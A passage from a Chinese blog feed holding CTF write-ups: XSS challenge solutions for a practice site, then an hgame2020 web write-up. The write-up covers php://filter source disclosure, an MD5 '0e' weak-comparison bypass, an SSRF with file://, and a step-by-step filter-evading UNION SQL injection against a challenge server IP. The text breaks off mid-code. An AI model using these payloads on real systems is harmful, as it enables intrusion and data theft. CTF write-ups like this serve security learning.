class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了<code>&lt;&gt;</code>内的所有字符，这样的话我们需要知道一个特性，就是当标签为<code>&lt;img</code>时，也是可以正常显示的，浏览器会自动补全标签</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&lt;!--</span><br></pre></td></tr></table></figure><h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只要求了匹配完整的<code>http://www.segmentfault.com</code>或者<code>https://www.segmentfault.com</code></p><p>这样的话，如果网站能够访问，那么我们加载<code>onload</code>事件，如果不能网站访问，那么我们加载<code>onerror</code>事件</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.segmentfault.com1&quot; onerror=&quot;alert(1)</span><br><span class="line"></span><br><span class="line">https://www.segmentfault.com&quot; onload=&quot;alert(1)</span><br></pre></td></tr></table></figure><h1 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><h1 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把输入的全部进行大写，这样的话函数和方法就会失效，但是我们可以用html编码绕过</p><p>这里其实有一个关于浏览器解析的知识，<code>script</code>标签内不支持html解析，只支持js解析，所以在script标签内使用html编码是无效的</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure><h1 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里跟上题一样，只是过滤了<code>script</code>，直接用上题的payload即可</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure><h1 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><h1 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h1><p>server code：<br>payload：</p><h1 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h1><p>server code：<br>payload：</p><h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p>server code：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里简单的引用一下网上的解释：Window 对象表示一个浏览器窗口或一个框架。在客户端 JavaScript 中，Window对象是全局对象，所有的表达式都在当前的环境中计算。也就是说，要引用当前窗口根本不需要特殊的语法，可以把那个窗口的属性作为全局变量来使用。例如，可以只写<code>document</code>，而不必写 <code>window.document</code>。</p><p>所以这里直接传值就好了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br></pre></td></tr></table></figure><h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p>server code：<br>payload：</p><h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><p>server code：<br>payload：</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xss.haozi.me/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目平台&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/haozi/xss-demo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week2_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/01/26/hgame2020-Level-Week2-Web-writeup/"/>
    <id>http://0clickjacking0.github.io/2020/01/26/hgame2020-Level-Week2-Web-writeup/</id>
    <published>2020-01-26T13:49:34.000Z</published>
    <updated>2020-02-04T04:28:52.318Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week2_Web_writeup</p><a id="more"></a><h2 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h2><p>打开题目，首先用伪协议读取<code>index.php</code>，<code>login.php</code>，<code>admin.php</code></p><p><code>php://filter/convert.base64-encode/resource=index.php</code></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = @$_GET[<span class="string">'action'</span>];</span><br><span class="line">$filter = <span class="string">"/config|etc|flag/i"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($filter, $_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker get out!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span> $action;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: ?action=login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">//Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&apos;debug&apos;])) &#123;</span><br><span class="line">        $debug = $_GET[&apos;debug&apos;];</span><br><span class="line">        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">        if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;用户名或密码错误&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmos的博客后台&lt;/title&gt;</span><br><span class="line">    &lt;link href=&quot;static/signin.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;static/sticky-footer.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class=&quot;form-signin&quot; method=&quot;post&quot; action=&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class=&quot;form-signin-heading&quot;&gt;后台登陆&lt;/h2&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;用户名&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;密码&quot; required&gt;</span><br><span class="line">        &lt;input class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;footer class=&quot;footer&quot;&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">        &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">            &lt;p class=&quot;text-muted&quot;&gt;Created by Annevi&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>admin.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">    header(&apos;Location: index.php&apos;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&apos;img_url&apos;])) &#123;</span><br><span class="line">        $img_url = @$_POST[&apos;img_url&apos;];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Cosmos&apos;Blog - 后台管理&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=&quot;logout.php&quot;&gt;退出登陆&lt;/a&gt;</span><br><span class="line">&lt;div style=&quot;text-align: center;&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&apos;username&apos;];?&gt; &lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">        &lt;legend&gt;插入图片&lt;/legend&gt;</span><br><span class="line">        &lt;p&gt;&lt;label&gt;图片url: &lt;input type=&quot;text&quot; name=&quot;img_url&quot; placeholder=&quot;&quot;&gt;&lt;/label&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;插入&lt;/button&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">    &lt;legend&gt;评论管理&lt;/legend&gt;</span><br><span class="line">    &lt;h2&gt;待开发..&lt;/h2&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;fieldset style=&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">    &lt;legend&gt;文章列表&lt;/legend&gt;</span><br><span class="line">    &lt;h2&gt;待开发..&lt;/h2&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;fieldset style=&quot;height: 50%&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-align: center;&quot;&gt;</span><br><span class="line">        &lt;img height=&apos;200&apos; width=&apos;500&apos; src=&apos;data:image/jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&apos;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>首先在<code>login.php</code>中的<code>第12行</code>存在环境变量的读取，这里我们可以获取到username和md5加密后的密码值</p><p><img src="http://images.xianyu123.club/Cosmos_blog1.png" alt></p><p>我们接着看<code>login.php</code>的<code>第22行</code>，这里密码比较是存在弱类型，所以可以用加密后也是<code>0e</code>开头的字符串即可绕过</p><p><img src="http://images.xianyu123.club/Cosmos_blog2.png" alt></p><p>接下来我们来看<code>admin.php</code>，这里host必须为localhost，且可以使用任何协议，直接用file协议进行读取</p><p><img src="http://images.xianyu123.club/Cosmos_blog3.png" alt></p><p>然后进行base64解码即可</p><h2 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h2><p>通过fuzz判断这里把<code>select</code>和空格替换为空了</p><p><code>select</code>绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=&apos;^(length(&apos;selselectect&apos;)=6)^&apos;</span><br></pre></td></tr></table></figure><p>空格过滤绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=&apos;^(length(&apos;%20&apos;)=1)^&apos;</span><br></pre></td></tr></table></figure><p>查询字段，这里只有一个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aorder%0aby%0a1%23</span><br></pre></td></tr></table></figure><p>查看可显字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(1)%23</span><br></pre></td></tr></table></figure><p>查询库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0adatabase()%23</span><br></pre></td></tr></table></figure><p>查询表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(sselectelect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database())%23</span><br></pre></td></tr></table></figure><p>查询值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.199.182.61/index.php?id=1&apos;%0aand%0a&apos;1&apos;=&apos;2&apos;%0aunion%0aseleselectct%0a(seleselectct%0a*%0afrom%0aeasysql.f1aggggggggggggg)%23</span><br></pre></td></tr></table></figure><h2 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h2><p><code>index.php</code>页面内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code = file_get_contents(<span class="string">'mycode'</span>);</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure><p>fuzz猜测<code>/mycode</code>果然存在，如下</p><p><img src="http://images.xianyu123.club/Cosmos_new_language1.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(base64_encode(encrypt(strrev(str_rot13(base64_encode(str_rot13(encrypt(strrev(strrev(base64_encode($_SERVER[<span class="string">'token'</span>])))))))))));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(@$_POST[<span class="string">'token'</span>] === $_SERVER[<span class="string">'token'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span>($_SERVER[<span class="string">'flag'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是解密，这里<code>python</code>涉及到编码转换问题，比较麻烦，所以我使用<code>php</code>来逆向解密，关键问题是<code>code</code>代码中的解密部分会一直改变，所以需要先抓取，其他就按一般步骤来就好了，下面是我的<code>exp</code>。有可能第一次跑不出flag，多运行几遍代码就可以出flag了</p><p><code>exp.php</code></p><figure class="highlight php"><table><tr><td 